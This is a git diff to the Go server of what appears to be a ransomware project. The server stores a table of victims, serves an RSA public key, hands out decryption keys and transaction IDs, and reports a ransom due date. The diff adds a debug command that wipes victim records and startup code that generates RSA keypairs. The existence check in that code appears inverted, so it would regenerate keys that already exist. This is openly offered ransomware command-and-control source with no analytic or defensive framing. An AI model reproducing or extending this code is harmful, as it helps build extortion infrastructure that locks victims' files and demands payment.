@@ -16,6 +16,7 @@ import (
 	"time"
 
 	"github.com/joho/godotenv"
+	"github.com/nireo/gocry/server/gen_rsa"
 	uuid "github.com/satori/go.uuid"
 	"gorm.io/driver/postgres"
 	"gorm.io/gorm"
@@ -56,7 +57,7 @@ func DecryptKey(w http.ResponseWriter, r *http.Request) {
 
 	uuid, err := uuid.NewV4()
 	if err != nil {
-		log.Fatalf("error generating uuid for key", uuid)
+		log.Fatalf("error generating uuid for key: %s", err)
 		return
 	}
 
@@ -180,6 +181,7 @@ func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+
 	// Load environment variables, such that we can take database parameters
 	if err := godotenv.Load(); err != nil {
 		log.Fatalf("could not load environment variables: %s", err)
@@ -202,6 +204,26 @@ func main() {
 
 	// always migrate the victim model
 	db.AutoMigrate(&Victim{})
+
+	// This is mostly just for debugging purposes
+	if len(os.Args) == 2 && os.Args[1] == "remove_data" {
+		var victims []Victim
+		db.Find(&victims)
+		for _, victim := range victims {
+			db.Delete(victim)
+		}
+
+		return
+	}
+
+	// ensure that a rsa keypair has been generated.
+	if _, err := os.Stat("./public.pem"); !os.IsNotExist(err) {
+		gen_rsa.GenerateRSAKeypair()
+	}
+
+	if _, err := os.Stat("./private.pem"); !os.IsNotExist(err) {
+		gen_rsa.GenerateRSAKeypair()
+	}
 
 	http.HandleFunc("/get_transaction", GiveTransactionID)
 	http.HandleFunc("/pubkey", GetRSAPubKey)
